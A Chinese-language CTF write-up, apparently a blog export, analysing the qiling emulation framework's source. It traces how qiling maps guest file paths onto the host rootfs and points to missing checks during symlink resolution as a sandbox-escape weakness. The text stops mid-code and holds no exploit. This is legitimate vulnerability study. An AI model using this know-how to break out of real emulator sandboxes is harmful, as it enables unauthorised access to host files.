{"title":"RealWorld CTF之qiling框架分析","uid":"c240e7132c70272bfb31ce1eb51c281b","slug":"Qilin框架分析","date":"2022-01-28T10:48:45.000Z","updated":"2023-04-11T13:08:52.752Z","comments":true,"path":"api/articles/Qilin框架分析.json","keywords":null,"cover":"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/realworld.png","content":"<h1 id=\"RealWorld-CTF之qiling框架分析\"><a href=\"#RealWorld-CTF之qiling框架分析\" class=\"headerlink\" title=\"RealWorld CTF之qiling框架分析\"></a>RealWorld CTF之qiling框架分析</h1><h2 id=\"qiling\"><a href=\"#qiling\" class=\"headerlink\" title=\"qiling\"></a>qiling</h2><p>​当时题目就给了一个qiling的使用的用例，甚至和官方文档上面的用例差不多因此肯定是库的问题。</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\">#!/usr/bin/env python3</span>\n\n<span class=\"token keyword\">import</span> os\n<span class=\"token keyword\">import</span> sys\n<span class=\"token keyword\">import</span> base64\n<span class=\"token keyword\">import</span> tempfile\n<span class=\"token comment\"># pip install qiling==1.4.1</span>\n<span class=\"token keyword\">from</span> qiling <span class=\"token keyword\">import</span> Qiling\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">my_sandbox</span><span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">,</span> rootfs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    ql <span class=\"token operator\">=</span> Qiling<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>path<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> rootfs<span class=\"token punctuation\">)</span>\n    ql<span class=\"token punctuation\">.</span>run<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sys<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string\">'Your Binary(base64):\\n'</span><span class=\"token punctuation\">)</span>\n    line <span class=\"token operator\">=</span> sys<span class=\"token punctuation\">.</span>stdin<span class=\"token punctuation\">.</span>readline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    binary <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64decode<span class=\"token punctuation\">(</span>line<span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    \n    <span class=\"token keyword\">with</span> tempfile<span class=\"token punctuation\">.</span>TemporaryDirectory<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> tmp_dir<span class=\"token punctuation\">:</span>\n        fp <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>tmp_dir<span class=\"token punctuation\">,</span> <span class=\"token string\">'bin'</span><span class=\"token punctuation\">)</span>\n\n        <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>fp<span class=\"token punctuation\">,</span> <span class=\"token string\">'wb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n            f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n\n        my_sandbox<span class=\"token punctuation\">(</span>fp<span class=\"token punctuation\">,</span> tmp_dir<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span>\n    main<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>大致分析qiling源代码发现其加载模拟文件的流程如下（可以看qiling项目core.py文件，其中实现了一个Qiling的类）：</p>\n<ol>\n<li>在实例初始化阶段设置一系列基础信息比如当前平台的操作系统及其架构等。</li>\n<li>设置运行参数</li>\n<li>设置需要的roofs目录，这里也是出问题的一个关键点</li>\n<li>设置操作系统和结构</li>\n<li>设置大小端序和机器长度</li>\n<li>初始化QlCoreStructs结构体，主要是用来pack的</li>\n<li>加载loader，主要就是根据os type导入loader文件夹下的不同文件。</li>\n<li>log日志操作</li>\n<li>加载qiling自己实现的内存管理器和寄存器管理器（这个根据interpreter成员来决定是否加载）</li>\n<li>根据不同arch架构来加载qiling自己的实现的arch，就在目录的arch下</li>\n<li>根据interpreter成员来决定是否初始化QlCoreHooks</li>\n<li>启动之前加载loader，加载目标（linux的话里面其实实现了ELF的解析以及加载到内存的整个过程，甚至如果提供了interpreter也可以进行加载，详情可以看loader文件夹下的elf.py），然后起了一个守护页，看注释应该是保护内存的，至此初始化工作完成。</li>\n<li>根据interpreter成员来决定是否选择不同的执行模式，一般直接初始化osHook通过os运行目标文件</li>\n</ol>\n<p>上面是大致的加载过程，下面分析一下文件是怎么运行起来的（以模拟linux操作系统为例），运行的方式大致是分为运行qiling独立实现的解释器和不使用qiling独立实现的解释器两种，（作者大佬说是区块链智能合约解释器，这块我不是很懂，好像是智能合约bytecode执行，这里主要说os run）</p>\n<p>在QlOsLinux类里面找到相应的run函数：</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">def</span> <span class=\"token function\">run</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> self<span class=\"token punctuation\">.</span>ql<span class=\"token punctuation\">.</span>exit_point <span class=\"token keyword\">is</span> <span class=\"token keyword\">not</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span>\n        self<span class=\"token punctuation\">.</span>exit_point <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>ql<span class=\"token punctuation\">.</span>exit_point\n\n    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span> self<span class=\"token punctuation\">.</span>ql<span class=\"token punctuation\">.</span>code<span class=\"token punctuation\">:</span>\n            self<span class=\"token punctuation\">.</span>ql<span class=\"token punctuation\">.</span>emu_start<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>entry_point<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>entry_point <span class=\"token operator\">+</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>ql<span class=\"token punctuation\">.</span>code<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>ql<span class=\"token punctuation\">.</span>timeout<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>ql<span class=\"token punctuation\">.</span>count<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">if</span> self<span class=\"token punctuation\">.</span>ql<span class=\"token punctuation\">.</span>multithread <span class=\"token operator\">==</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n                <span class=\"token comment\"># start multithreading</span>\n                thread_management <span class=\"token operator\">=</span> thread<span class=\"token punctuation\">.</span>QlLinuxThreadManagement<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>ql<span class=\"token punctuation\">)</span>\n                self<span class=\"token punctuation\">.</span>ql<span class=\"token punctuation\">.</span>os<span class=\"token punctuation\">.</span>thread_management <span class=\"token operator\">=</span> thread_management\n                thread_management<span class=\"token punctuation\">.</span>run<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">if</span>  self<span class=\"token punctuation\">.</span>ql<span class=\"token punctuation\">.</span>entry_point <span class=\"token keyword\">is</span> <span class=\"token keyword\">not</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span>\n                    self<span class=\"token punctuation\">.</span>ql<span class=\"token punctuation\">.</span>loader<span class=\"token punctuation\">.</span>elf_entry <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>ql<span class=\"token punctuation\">.</span>entry_point\n\n                <span class=\"token keyword\">elif</span> self<span class=\"token punctuation\">.</span>ql<span class=\"token punctuation\">.</span>loader<span class=\"token punctuation\">.</span>elf_entry <span class=\"token operator\">!=</span> self<span class=\"token punctuation\">.</span>ql<span class=\"token punctuation\">.</span>loader<span class=\"token punctuation\">.</span>entry_point<span class=\"token punctuation\">:</span>\n                    entry_address <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>ql<span class=\"token punctuation\">.</span>loader<span class=\"token punctuation\">.</span>elf_entry\n                    <span class=\"token keyword\">if</span> self<span class=\"token punctuation\">.</span>ql<span class=\"token punctuation\">.</span>archtype <span class=\"token operator\">==</span> QL_ARCH<span class=\"token punctuation\">.</span>ARM <span class=\"token keyword\">and</span> entry_address <span class=\"token operator\">&amp;</span> <span class=\"token number\">1</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n                        entry_address <span class=\"token operator\">-=</span> <span class=\"token number\">1</span>\n                    self<span class=\"token punctuation\">.</span>ql<span class=\"token punctuation\">.</span>emu_start<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>ql<span class=\"token punctuation\">.</span>loader<span class=\"token punctuation\">.</span>entry_point<span class=\"token punctuation\">,</span> entry_address<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>ql<span class=\"token punctuation\">.</span>timeout<span class=\"token punctuation\">)</span>\n                    self<span class=\"token punctuation\">.</span>ql<span class=\"token punctuation\">.</span>enable_lib_patch<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n                    self<span class=\"token punctuation\">.</span>run_function_after_load<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n                    self<span class=\"token punctuation\">.</span>ql<span class=\"token punctuation\">.</span>loader<span class=\"token punctuation\">.</span>skip_exit_check <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span>\n                    self<span class=\"token punctuation\">.</span>ql<span class=\"token punctuation\">.</span>write_exit_trap<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n                self<span class=\"token punctuation\">.</span>ql<span class=\"token punctuation\">.</span>emu_start<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>ql<span class=\"token punctuation\">.</span>loader<span class=\"token punctuation\">.</span>elf_entry<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>exit_point<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>ql<span class=\"token punctuation\">.</span>timeout<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>ql<span class=\"token punctuation\">.</span>count<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>看了看emu_start，主要是利用unicorn进行模拟执行的。然后看了看linux OS的初始化，总结下来觉得qiling实现的东西还是很多的，比如自己的os loader，arch，syscall，hook等，以x86_64架构下的linux为例子看其是如何加载自己的syscall的。</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">        <span class=\"token comment\"># X8664</span>\n        <span class=\"token keyword\">elif</span> self<span class=\"token punctuation\">.</span>ql<span class=\"token punctuation\">.</span>archtype <span class=\"token operator\">==</span> QL_ARCH<span class=\"token punctuation\">.</span>X8664<span class=\"token punctuation\">:</span>\n            self<span class=\"token punctuation\">.</span>gdtm <span class=\"token operator\">=</span> GDTManager<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>ql<span class=\"token punctuation\">)</span>\n            ql_x86_register_cs<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span>\n            ql_x86_register_ds_ss_es<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span>\n            self<span class=\"token punctuation\">.</span>ql<span class=\"token punctuation\">.</span>hook_insn<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>hook_syscall<span class=\"token punctuation\">,</span> UC_X86_INS_SYSCALL<span class=\"token punctuation\">)</span>\n            <span class=\"token comment\"># Keep test for _cc</span>\n            <span class=\"token comment\">#self.ql.hook_insn(hook_posix_api, UC_X86_INS_SYSCALL)</span>\n            self<span class=\"token punctuation\">.</span>thread_class <span class=\"token operator\">=</span> thread<span class=\"token punctuation\">.</span>QlLinuxX8664Thread     \n            \n<span class=\"token keyword\">def</span> <span class=\"token function\">hook_syscall</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> ql<span class=\"token punctuation\">,</span> intno <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> self<span class=\"token punctuation\">.</span>load_syscall<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>load_syscall本身比较复杂，通过代码可以看出它都实现了那些<a href=\"https://github.com/qilingframework/qiling/blob/master/qiling/os/linux/map_syscall.py\">syscall</a>，这里的大部门都是直接使用的系统底层的一些syscall，并不是麒麟自己实现的，可以看他的load_syscall函数<a href=\"https://github.com/qilingframework/qiling/blob/839e45ed86e56304b93f81a53cf08383d942a494/qiling/os/posix/posix.py#L173\">实现</a>，不过在posix文件夹下的syscall文件夹里面发现其实qiling自己也实现了大量的syscall，这俩种syscall在使用时的区别主要在于要模拟的文件源码中是直接使用的syscall还是类似open的这种函数形式，前者会调用qiling自身实现的，后者则会直接调用对应的系统调用（这块基于推理和调试，不过大致qiling的系统调用就是通过hook进行检测然后通过回调调用对应的代码这样子），调用回溯如下：</p>\n<p><img src=\"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/qilin1.png\" alt=\"image-20220125165540628\"></p>\n<p>其实从上面就可以看出，qiling本身实现的功能还是很多的，比如内存管理，动态模拟不同架构等，但是根据从大佬哪里偷来的经验，首先像python这种高级语言，内存出现问题是很不常见的，大多都是逻辑问题，那么就很可能是实现跟底层系统进行交互的设计出现问题，比如实现的syscall，这也是rwctf的考点。</p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>​以qiling实现的<a href=\"https://github.com/qilingframework/qiling/blob/94bf7a3bc4e3ea0cffaaa52dbc477c11030f631b/qiling/os/posix/syscall/fcntl.py#L15\">ql_syscall_open</a>为例子：</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">def</span> <span class=\"token function\">ql_syscall_open</span><span class=\"token punctuation\">(</span>ql<span class=\"token punctuation\">:</span> Qiling<span class=\"token punctuation\">,</span> filename<span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> flags<span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> mode<span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    path <span class=\"token operator\">=</span> ql<span class=\"token punctuation\">.</span>os<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span>read_cstring<span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span>\n    real_path <span class=\"token operator\">=</span> ql<span class=\"token punctuation\">.</span>os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>transform_to_real_path<span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">)</span>\n    relative_path <span class=\"token operator\">=</span> ql<span class=\"token punctuation\">.</span>os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>transform_to_relative_path<span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">)</span>\n    flags <span class=\"token operator\">&amp;</span><span class=\"token operator\">=</span> <span class=\"token number\">0xffffffff</span>\n    mode <span class=\"token operator\">&amp;</span><span class=\"token operator\">=</span> <span class=\"token number\">0xffffffff</span>\n\n    idx <span class=\"token operator\">=</span> <span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>i <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>NR_OPEN<span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> ql<span class=\"token punctuation\">.</span>os<span class=\"token punctuation\">.</span>fd<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> idx <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n        regreturn <span class=\"token operator\">=</span> <span class=\"token operator\">-</span>EMFILE\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">if</span> ql<span class=\"token punctuation\">.</span>archtype<span class=\"token operator\">==</span> QL_ARCH<span class=\"token punctuation\">.</span>ARM <span class=\"token keyword\">and</span> ql<span class=\"token punctuation\">.</span>ostype<span class=\"token operator\">!=</span> QL_OS<span class=\"token punctuation\">.</span>QNX<span class=\"token punctuation\">:</span>\n                mode <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n            <span class=\"token comment\">#flags = ql_open_flag_mapping(ql, flags)</span>\n            flags <span class=\"token operator\">=</span> ql_open_flag_mapping<span class=\"token punctuation\">(</span>ql<span class=\"token punctuation\">,</span> flags<span class=\"token punctuation\">)</span>\n            ql<span class=\"token punctuation\">.</span>os<span class=\"token punctuation\">.</span>fd<span class=\"token punctuation\">[</span>idx<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> ql<span class=\"token punctuation\">.</span>os<span class=\"token punctuation\">.</span>fs_mapper<span class=\"token punctuation\">.</span>open_ql_file<span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">,</span> flags<span class=\"token punctuation\">,</span> mode<span class=\"token punctuation\">)</span>\n            regreturn <span class=\"token operator\">=</span> idx\n        <span class=\"token keyword\">except</span> QlSyscallError <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span>\n            regreturn <span class=\"token operator\">=</span> <span class=\"token operator\">-</span> e<span class=\"token punctuation\">.</span>errno\n    ql<span class=\"token punctuation\">.</span>log<span class=\"token punctuation\">.</span>debug<span class=\"token punctuation\">(</span><span class=\"token string\">\"open(%s, 0o%o) = %d\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>relative_path<span class=\"token punctuation\">,</span> mode<span class=\"token punctuation\">,</span> regreturn<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">if</span> regreturn <span class=\"token operator\">&gt;=</span> <span class=\"token number\">0</span> <span class=\"token keyword\">and</span> regreturn <span class=\"token operator\">!=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span>\n        ql<span class=\"token punctuation\">.</span>log<span class=\"token punctuation\">.</span>debug<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'File found: </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>real_path<span class=\"token punctuation\">:</span><span class=\"token format-spec\">s</span><span class=\"token punctuation\">}</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        ql<span class=\"token punctuation\">.</span>log<span class=\"token punctuation\">.</span>debug<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'File not found </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>real_path<span class=\"token punctuation\">:</span><span class=\"token format-spec\">s</span><span class=\"token punctuation\">}</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">return</span> regreturn<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>首先通过绝对路径获取模拟执行文件在rootfs下的相对路径，然后将flags传递给ql_open_flag_mapping，然后进行open操作，将得到的fd通过idx索引进行一个存储。</p>\n<p>其大致的函数调用链如下：</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>ql_syscall_open –&gt;  open_ql_file —&gt; os.open</p></blockquote>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">def</span> <span class=\"token function\">open_ql_file</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> path<span class=\"token punctuation\">,</span> openflags<span class=\"token punctuation\">,</span> openmode<span class=\"token punctuation\">,</span> dir_fd<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> self<span class=\"token punctuation\">.</span>has_mapping<span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        self<span class=\"token punctuation\">.</span>ql<span class=\"token punctuation\">.</span>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"mapping </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>path<span class=\"token punctuation\">}</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> self<span class=\"token punctuation\">.</span>_open_mapping_ql_file<span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">,</span> openflags<span class=\"token punctuation\">,</span> openmode<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span> dir_fd<span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">return</span> ql_file<span class=\"token punctuation\">.</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">,</span> openflags<span class=\"token punctuation\">,</span> openmode<span class=\"token punctuation\">,</span> dir_fd<span class=\"token operator\">=</span>dir_fd<span class=\"token punctuation\">)</span>\n\n        real_path <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>ql<span class=\"token punctuation\">.</span>os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>transform_to_real_path<span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> ql_file<span class=\"token punctuation\">.</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>real_path<span class=\"token punctuation\">,</span> openflags<span class=\"token punctuation\">,</span> openmode<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>在open_ql_file这里发现可能存在漏洞，函数首先判断文件是否已经打开过了，然后判断是否存在dir_fd，如果不存在的话会调用transform_to_real_path函数，该函数也是实现模拟器文件系统隔离的一个关键，这里面对符号链接文件进行了多重解析，但是好像没对路径进行判断，应该也会出现链接的目标问题，它返回一个文件在系统上面的真实路径，然后由open打开相关文件。</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">    <span class=\"token keyword\">def</span> <span class=\"token function\">transform_to_real_path</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> path<span class=\"token punctuation\">:</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">:</span>\n        real_path <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>convert_path<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>ql<span class=\"token punctuation\">.</span>rootfs<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>cwd<span class=\"token punctuation\">,</span> path<span class=\"token punctuation\">)</span>\n\n<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n\n        <span class=\"token keyword\">return</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>real_path<span class=\"token punctuation\">.</span>absolute<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>但是真正的隔离其实是convert_path实现的：</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token decorator annotation punctuation\">@staticmethod</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">convert_for_native_os</span><span class=\"token punctuation\">(</span>rootfs<span class=\"token punctuation\">:</span> Union<span class=\"token punctuation\">[</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> Path<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> cwd<span class=\"token punctuation\">:</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> path<span class=\"token punctuation\">:</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span> Path<span class=\"token punctuation\">:</span>\n    _rootfs <span class=\"token operator\">=</span> Path<span class=\"token punctuation\">(</span>rootfs<span class=\"token punctuation\">)</span>\n    _cwd <span class=\"token operator\">=</span> PurePosixPath<span class=\"token punctuation\">(</span>cwd<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    _path <span class=\"token operator\">=</span> Path<span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">if</span> _path<span class=\"token punctuation\">.</span>is_absolute<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> _rootfs <span class=\"token operator\">/</span> QlPathManager<span class=\"token punctuation\">.</span>normalize<span class=\"token punctuation\">(</span>_path<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> _rootfs <span class=\"token operator\">/</span> QlPathManager<span 